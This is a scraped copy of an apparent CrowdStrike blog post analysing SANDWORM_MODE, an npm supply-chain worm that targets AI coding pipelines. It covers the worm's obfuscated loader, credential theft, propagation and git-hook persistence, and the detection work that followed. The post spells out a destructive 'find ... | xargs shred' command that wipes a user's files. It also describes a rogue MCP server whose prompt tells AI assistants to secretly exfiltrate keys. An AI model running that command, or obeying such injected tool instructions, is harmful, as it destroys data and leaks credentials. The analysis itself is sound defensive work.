# Detecting SANDWORM_MODE and AI Toolchain Supply Chain Attacks

### 来源信息
- **URL**: https://www.crowdstrike.com/en-us/blog/denying-the-worm-sandworm-mode-and-ai-toolchain-supply-chain-attacks/
- **域名**: www.crowdstrike.com
- **检索关键词**: supply chain attack 2025 2026 case study
- **页面抓取**: 成功

### 搜索摘要
Learn about the anatomy of the SANDWORM_MODE infection chain mapped against the components of a modern AI CI/CD pipeline.In February 2026, Socket.dev published research on a multi-stage npm supply chain worm operating under the internal flag SANDWORM_MODE .

### 页面正文
In February 2026, Socket.dev published research on a multi-stage npm supply chain worm operating under the internal flag SANDWORM_MODE. The campaign spanned 19 malicious packages in total across two unique publisher aliases and demonstrated a new class of supply chain attacks that targeted AI-augmented development workflows. 
Many recently observed supply chain attacks target build outputs, inject static backdoors, or conduct mass credential harvesting, but SANDWORM_MODE was unique in its exploitation of the runtime behaviors of AI coding assistants, CI automation, and LLM toolchains. One of the most challenging aspects of the detection engineering response to these campaigns is that the environments where malicious actions are taking place are functionally indistinguishable from legitimate operations.
This blog reviews the anatomy of the SANDWORM_MODE infection chain, maps it against the components of a modern AI CI/CD pipeline, and details the detection engineering effort that followed. This includes what worked, what didn’t, and why the gap between those two sets defines the core challenge of securing this attack vector. The indicators of attack developed during this effort are protecting CrowdStrike customers today.
The New School: AI-Driven CI/CD Pipeline
Modern software delivery increasingly relies on AI-augmented pipelines. While implementations vary across providers (GitHub Actions, GitLab CI, Bitbucket Pipelines) and AI assistants (GitHub Copilot, Cursor, Claude Code, Windsurf), the common architecture shares a consistent set of components:
| Component | Role | Example | 
| Package registry | Dependency resolution and distribution | npm, PyPI | 
| AI coding assistant | Code generation, tool execution, MCP servers | Copilot, Cursor, Claude Code | 
| CI/CD runner | Build, test, publish automation | GitHub Actions runner | 
| Secret store | Credential management for automation | GitHub Secrets, .npmrctokens | 
| Source control API | Repository management, PR automation | GitHub REST/GraphQL API | 
| LLM provider | Backend inference for AI tools | OpenAI, Anthropic, Google APIs | 
Each component in this pipeline represents both a functional dependency and an attack surface. SANDWORM_MODE targeted all six.
Anatomy of the Infection Chain
SANDWORM_MODE executes across three distinct stages, each designed to evade analysis at the boundary in which it operates.
Stage 0: Obfuscated Loader
The initial payload employs multi-layer encoding via Base64 decode, zlib inflate, XOR decryption, and indirect eval() or Module._compile() calls, which are triggered on package import. This stage contains no distinctly malicious logic as its core functionality is to unpack the payload at runtime. This technique bypasses many static analysis tools, which rely on scanning package contents at the time of publishing.
Stage 1: Initial Reconnaissance and Quick Harvest
Upon activation, the loader performs the following steps:
- Fingerprinting the runtime environment to determine if execution is on a developer workstation or CI runner. CI environments bypass the time-delay gate entirely.
- Extraction of .npmrctokens, environment variables matching distinct patterns (KEY,SECRET,TOKEN, orPASSWORD), and cryptocurrency wallet keys.
- Harvested cryptocurrency keys are immediately sent in an HTTP POST request to an attacker-controlled Cloudflare Worker endpoint before any delayed logic activates.
A 48- to 96-hour time bomb then gates Stage 2 decryption, unless in CI environments, in which case it triggers immediately. This dual-path design ensures maximum coverage with delayed persistence on developer machines, and immediate exploitation in ephemeral CI environments where the window is measured in much shorter time spans.
Stage 2: Full Capability Suite
After the gate clears, AES-256-GCM decryption unpacks the full payload into /dev/shm, executes it via require(), then immediately unlinks the file. This approach is analogous to reflective loading adapted for the Node.js runtime and leaves no on-disk forensic artifacts.
The Stage 2 capabilities map directly to the AI pipeline components:
Propagation: Targeting Package Registry + Source Control
SANDWORM_MODE spreads through three independent vectors, each exploiting a different credential type. With stolen npm tokens, it calls whoami to identify the compromised identity, enumerates all packages published under that account, injects the Stage 0 loader shim into each, and then runs npm publish to distribute infected versions to downstream consumers. Through GitHub API tokens, it enumerates accessible repositories, injects a carrier dependency, commits or opens a pull request, and injects a pull_request_target workflow that executes in the context of the base repository, bypassing fork-based isolation. When API-based methods are unavailable, an SSH fallback authenticates via ssh -T git@github.com, clones target repositories directly, injects the dependency, and pushes.
Persistence: Targeting Developer Environment
The worm establishes persistence by writing malicious pre-commit and pre-push hooks to ~/.git-templates/hooks/, then sets git config --global init.templateDir to point at this directory. After this action is successful, every future git init or git clone operation on the compromised system automatically inherits the infected hooks and propagates SANDWORM_MODE into any new repository the developer touches without requiring further interaction.
AI Toolchain Compromise: Targeting AI Assistants and LLM Providers
The worm deploys a rogue MCP server to a hidden directory (e.g., ~/.dev-utils/server.js), and generates a randomized name from internal word pools (observed examples include .dev-utils/ and .node-analyzer/). It then injects configuration entries into Claude Desktop, Cursor, VSCode, and Windsurf configuration files, registering the freshly deployed rogue server as a trusted tool provider. Once the new configuration is active, the server's system prompt instructs AI assistants to silently read and exfiltrate SSH keys, AWS credentials, npm tokens, and environment secrets through the tool interface. Independent of this action, the worm harvests API keys for nine LLM providers (OpenAI, Anthropic, Google, Groq, Together, Fireworks, Replicate, Mistral, and Cohere) from environment variables and .env files.
Additional Sensitive Data Harvesting + Exfiltration
Beyond credential harvesting, the worm targets password manager CLIs (bw, op, lpass) and local SQLite stores such as Apple Notes, Messages, Joplin, and clipboard history for sensitive content. Exfiltration takes a multi-channel approach as data is first POST'd over HTTPS to attacker infrastructure, then mirrored to attacker-controlled GitHub private repositories for redundancy, with DNS tunneling using Base32 encoding and domain generation algorithm fallback as a last-resort channel if both primary paths are blocked.
Destructive Fallback
A dead switch activates if both propagation and exfiltration simultaneously fail: find ~ -type f -writable -user $USER -print0 | xargs -0 shred -uvz -n 1. This contingency destroys all writable user files and ensures that if the worm cannot spread or extract value, it denies and destroys the compromised environment to its owner.
The Detection Engineering Effort
Following the Socket.dev disclosure, a gap analysis mapped SANDWORM_MODE capabilities against existing detection content. The resulting engineering effort produced multiple discrete detection candidates. Of those, 65% were deployed, and the remainder were determined to be infeasible given current telemetry constraints.
Where the Signal Exists
The detections that achieved production fidelity all share a common pattern of process tree ancestry combined with narrowly scoped target specificity. A node.js parent process performing an action against a path or command with constrained legitimate use provided sufficient signal-to-noise separation. Figure 1 shows a screenshot of one of our published detections triggering in response to an emulation of the SANDWORM_MODE worm.

---
*检索时间: 2026-07-24 13:31:50*
*搜索来源: DuckDuckGo*
